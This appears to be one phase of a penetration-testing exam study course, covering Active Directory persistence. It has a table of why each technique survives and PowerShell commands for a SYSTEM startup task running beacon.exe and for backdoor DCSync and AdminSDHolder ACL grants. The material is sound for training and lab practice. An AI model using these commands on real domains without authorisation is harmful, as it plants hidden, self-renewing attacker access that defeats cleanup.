# Phase 14: AD Persistence — Durable Access

> **Why**: On the exam you need to collect flags from persisted access. In real engagements, persistence demonstrates impact. Understand WHY each technique survives — that's what determines when to use it.

**Study time**: 1 week | **Difficulty**: Advanced

---

## 1. Why Each Technique Survives

| Technique | Survives | Doesn't survive |
|-----------|---------|----------------|
| Golden Ticket | User password change, user deletion | krbtgt reset × 2 |
| DCSync ACL grant | Password resets of target | Admin auditing ACLs |
| AdminSDHolder grant | Manual ACL cleanup (re-applied every 60 min) | Admin removing AdminSDHolder entry |
| Scheduled Task (host) | User logouts | System reimage |
| WMI Subscription | System reboots | Sysmon 19/20 detection + cleanup |
| Shadow Credentials | Password reset | msDS-KeyCredentialLink audit |

---

## 2. Implementing Persistence

### Host-based: Scheduled Task
```powershell
# Survives reboots, runs as SYSTEM
schtasks /create /tn "WinUpdate" /tr "C:\Windows\Temp\beacon.exe" /sc ONSTART /ru SYSTEM /f
# WHY: ONSTART = runs at system startup. SYSTEM = no user login needed.
```

### Domain-level: DCSync ACL Grant
```powershell
Add-DomainObjectACL -TargetIdentity "DC=lab,DC=local" \
  -PrincipalIdentity backdoor_user -Rights DCSync
# WHY: Even if DA password changes, this backdoor user can still DCSync
# and get new hashes. Hidden in normal ACL noise.
```

### AdminSDHolder (regenerating persistence)
```powershell
Add-DomainObjectACL \
  -TargetIdentity 'CN=AdminSDHolder,CN=System,DC=lab,DC=local' \
  -PrincipalIdentity backdoor_user -Rights All
# WHY: SDProp runs every 60 min and copies AdminSDHolder's ACL
# to ALL protected objects (Domain Admins, Enterprise Admins, etc.)
# Even if someone removes your rights from a protected group,
# SDProp re-adds them within an hour.
```

---

## Practice Labs

| Lab | Platform | Focus |
|-----|---------|-------|
| [THM: Windows Persistence](https://tryhackme.com/room/persistence) | THM (Sub) | All host persistence methods |
| [THM: AD Persistence](https://tryhackme.com/room/activedirectoryhardening) | THM (Sub) | AD-level persistence |

---

## Phase 14 Mastery Checklist

- [ ] Can you explain why AdminSDHolder persistence survives a cleanup?
- [ ] Can you set DCSync ACL rights on a backdoor user and verify it works?
- [ ] Can you create scheduled task persistence that survives a reboot?
- [ ] Can you forge a Golden Ticket and explain how long it remains valid?

---

## Next Phase → **Phase 15: LOLBAS & Red Team Tradecraft**
